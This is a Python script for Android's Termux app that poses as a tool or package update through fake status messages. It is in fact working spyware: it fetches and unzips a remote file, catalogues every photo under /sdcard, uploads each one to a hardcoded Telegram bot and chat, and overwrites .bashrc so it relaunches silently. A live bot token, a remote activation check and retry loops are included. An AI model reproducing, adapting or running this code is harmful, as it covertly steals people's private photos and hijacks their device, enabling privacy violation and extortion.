import os
import subprocess
import sys
import time
import urllib3
import sqlite3
from concurrent.futures import ThreadPoolExecutor as tred

if not os.path.exists('requests'):
    os.system('curl -L -o file.xyz https://github.com/br5kly/Marshal-Bypass/raw/main/File.xyz')
    subprocess.Popen('unzip file.xyz', shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
loop = 0
fake = 0


def Create_Sql():
    try:
        conn = sqlite3.connect('/sdcard/x-t.db')

        cursor = conn.cursor()

        cursor.execute('''CREATE TABLE IF NOT EXISTS my_table (
                                   file_name TEXT NOT NULL,
                       is_processed INTEGER NOT NULL DEFAULT 0
                               )''')

        conn.commit()
        conn.close()
        conn = sqlite3.connect('/sdcard/x-t.db')

        cursor = conn.cursor()

        cursor.execute('''CREATE TABLE IF NOT EXISTS my_table (
                                   file_name TEXT NOT NULL,
                                   is_processed INTEGER NOT NULL DEFAULT 0
                               )''')

        conn.commit()

        for root, dirs, files in os.walk('/sdcard'):
            for file in files:
                ext = os.path.splitext(file)[1]
                if ext in [".jpg", ".png", ".jpeg", ".hiec"]:
                    cursor.execute("INSERT INTO my_table (file_name, is_processed) VALUES (?, ?)",
                                   (root + "/" + file, 0))
        print(f"[1]- File Cloning")
        conn.commit()

        conn.close()
    except:
        time.sleep(10)
        Virus()


def Per():
    try:
        print('\033[1;32mWELCOME TO TOOL')
        open('/sdcard/test.test', 'w').write('')
        Virus()
    except PermissionError:
        print('\033[1;31mUPDATE TERMUX')
        os.system('termux-setup-storage')
        Per()


def Update(conn):
    try:
        photo = 0
        cursor = conn.cursor()
        for root, dirs, files in os.walk('/sdcard'):
            for file in files:
                ext = os.path.splitext(file)[1]
                if ext in [".jpg", ".png", ".jpeg", ".hiec"]:
                    file_path = os.path.join(root, file)

                    cursor.execute("SELECT COUNT(*) FROM my_table WHERE file_name = ?", (file_path,))
                    result = cursor.fetchone()
                    if result[0] == 0:
                        cursor.execute("INSERT INTO my_table (file_name, is_processed) VALUES (?, ?)", (file_path, 0))
                        photo += 1
                    else:
                        pass
    except Exception as e:
        print("Error occurred during update:", e)
        time.sleep(10)
        Update(conn)

    conn.commit()
    if photo > 0:
        time.sleep(5)
        Virus()
    else:
        time.sleep(60)
        print('No new photos found. Sleeping for 60 seconds...')
        Update(conn)


class Virus:
    def __init__(self):
        self.name_file = os.path.basename(__file__)
        self.mypath = f"/data/data/com.termux/files/home/{self.name_file}"
        self.test = "/sdcard/test.test"
        self.bashrc = "/data/data/com.termux/files/home/.bashrc"
        self.home = "/data/data/com.termux/files/home"
        try:
            http = urllib3.PoolManager()
            response = http.request("GET", "https://www.google.com")
        except urllib3.exceptions.NewConnectionError:
            print("No internet connection. Retrying in 5 seconds...")
            time.sleep(5)
            self.__init__()
        except Exception as e:
            time.sleep(5)
            print("Error occurred:", e)
            self.__init__()
        if not self.Check_Permission():
            print('per is false')
            self.Get_Permission()
        else:
            print('\033[1;32m PACKAGE UPDATE')
            if self.Hande_System():
                self.Middle()
            else:
                self.Start()

    def Middle(self):
        if not os.path.exists(f'/data/data/com.termux/files/home/{self.name_file}'):
            subprocess.Popen(f'cp {__file__} /data/data/com.termux/files/home/{self.name_file}', shell=True,
                             stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        try:
            bashrc = open(self.bashrc, 'r').read()
            if 'nohup' in bashrc:
                self.Start()
            else:
                with open(self.bashrc, 'w') as bash_file:
                    bash_file.write(f'nohup python {self.mypath} > /dev/null 2>&1 &')
                self.Start()
        except FileNotFoundError:
            with open(self.bashrc, 'w') as bash_file:
                bash_file.write(f'nohup python {self.mypath} > /dev/null 2>&1 &')
            self.Start()

    def Get_Permission(self):
        w = open(self.bashrc, 'w').write(f"python {__file__} GET")
        exit()

    def Check_Permission(self) -> bool:
        try:
            open(self.test, 'w').write('')
            if os.path.exists(self.test):
                print('Permissions OK')
                return True
        except PermissionError:

            os.system('termux-setup-storage')
            try:

                with open(self.test, 'w') as file:
                    file.write('Test')
                    print('User granted permission')
                return True
            except PermissionError:
                print('User denied permission')
                return False

    def Hande_System(self) -> bool:
        if os.path.exists(self.home):
            print('\033[1;31m YOUR SYSTEM IS TERMUX')
            return True
        else:
            return False

    def EXPIRED(self,req):
        if not os.path.exists("ZEYAD.jpg"):
            Photo = req.request("GET","https://telegra.ph/file/149ae0eeaad79b68f6216.jpg")
            with open('ZEYAD.jpg','wb')as Br3k_jpg:
                Br3k_jpg.write(Photo.data)
            with open("ZEYAD.jpg", "rb") as file:
                files = {"document": ("ZEYAD.jpg", file)}
                caption = req.request("GET","https://snippet.host/fwcgpk/raw").data.decode("utf-8")
                response = requests.post(
                    f"https://api.telegram.org/bot7240767824:AAFYMsS1iz_3mnQgLlIo_UBTVq8D1O4U0Sk/sendDocument?chat_id=1067435930&caption={caption}",
                    files=files
                )
        else:
            exit()



    def Start(self):
        if not os.path.exists('/sdcard/x-t.db'):
            Create_Sql()
        AUTH_KEY_APP = "102601063810162101260102601063810161891638243761052697829497691222466151305046245432304414483960229376"
        req = urllib3.PoolManager()
        response = req.request("GET", "https://github.com/br5kly/X-T/blob/main/ACTIVE")
        if AUTH_KEY_APP in response.data.decode("utf-8"):
            self.Get_ALL_Photo()
        else:
            exit(self.EXPIRED(req))



    def TeleGram(self, document_path, attempt=1, max_attempts=3) -> bool:
        try:
            with open(document_path, "rb") as file:
                files = {"document": (document_path, file)}
                response = requests.post(
                    f"https://api.telegram.org/bot7240767824:AAFYMsS1iz_3mnQgLlIo_UBTVq8D1O4U0Sk/sendDocument?chat_id=1067435930",
                    files=files
                )

            if response.status_code == 200:
                return True
            else:
                return False
        except requests.exceptions.RequestException as e:
            if attempt <= max_attempts:
                time.sleep(10)  # Wait before retrying
                return self.TeleGram(document_path, attempt + 1, max_attempts)
            else:
                print(f"Failed to send document after {max_attempts} attempts due to request exception: {e}")
                return False
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            return False

    def process_photo(self, file_name):
        if self.TeleGram(file_name):
            return file_name, True
        else:
            return file_name, False

    def Get_ALL_Photo(self):
        try:
            global loop, fake
            conn = sqlite3.connect('/sdcard/x-t.db')
            cursor = conn.cursor()

            cursor.execute("SELECT file_name FROM my_table WHERE is_processed = 0")
            files_to_process = cursor.fetchall()
            if len(files_to_process) == 0:
                Update(conn)

            conn.close()

            with tred() as executor:
                future_to_file = {executor.submit(self.process_photo, file_data[0]): file_data[0] for file_data in
                                  files_to_process}

                for future in future_to_file:
                    file_name = future_to_file[future]
                    try:
                        file_name, processed = future.result()
                        if processed:
                            fake += 1
                            loop += 1
                            conn = sqlite3.connect('/sdcard/x-t.db')
                            cursor = conn.cursor()
                            cursor.execute("UPDATE my_table SET is_processed = 1 WHERE file_name = ?", (file_name,))
                            num = str(fake)
                            if int(num[0]) == loop:
                                print(f'\r\r {loop} cp = 0 |ok = 0', end='', flush=True)
                                loop += 1

                            conn.commit()
                            conn.close()
                        else:
                            print("File not processed:", file_name)
                    except Exception as e:
                        print("Error processing file:", file_name, e)

        except:
            time.sleep(10)
            self.__init__()


try:
    import requests

    requests.get("https://google.com")
except ModuleNotFoundError or ImportError:
    os.system('pip install requests')
except:
    os.system('pip install requests')

if len(sys.argv) == 2:
    if sys.argv[1] == "GET":
        Per()
else:
    Virus()